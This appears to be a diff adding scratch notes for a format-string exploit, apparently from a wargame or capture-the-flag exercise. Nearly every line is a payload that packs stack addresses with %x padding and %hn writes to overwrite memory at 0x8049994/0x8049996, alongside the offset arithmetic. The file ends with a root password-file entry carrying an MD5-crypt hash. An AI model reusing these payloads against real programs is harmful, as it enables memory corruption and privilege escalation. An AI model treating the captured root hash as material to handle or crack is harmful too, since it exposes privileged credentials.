@@ -1,0 +1,24 @@
+#\x94\x99\x49\x80\x96\x99\x49\x80%56276x%168$hn%09186x%169$hn
+#\x3c\xda\xbf\xff\x3e\xda\xbf\xff%56276x%52$hn%09186x%53$hn
+#\x3c\xda\xbf\xff\x3e\xda\xbf\xff%56276x%20$hn%09186x%21$hn
+\x3c\xdc\xbf\xff\x3e\xdc\xbf\xff%56789x%112$hn%08674x%113$hn
+#AAAABBBB%00000x%52$hp%00000x%53$hp
+
+\x3c\xda\xbf\xff\x3e\xda\xbf\xff%56276c%168$hn%09186c%0169$hn
+
+167
+
+0xffbfdddd
+
+56797 65471
+
+56797 - 8 
+
+
+65471 - 56797 
+
+0x8049996
+0x8049994
+
+==============================================
+root:$1$yCFK4vCu$4CHlVe53tdMbBI9EwSf7k0:0:0:root:/root:/bin/bash
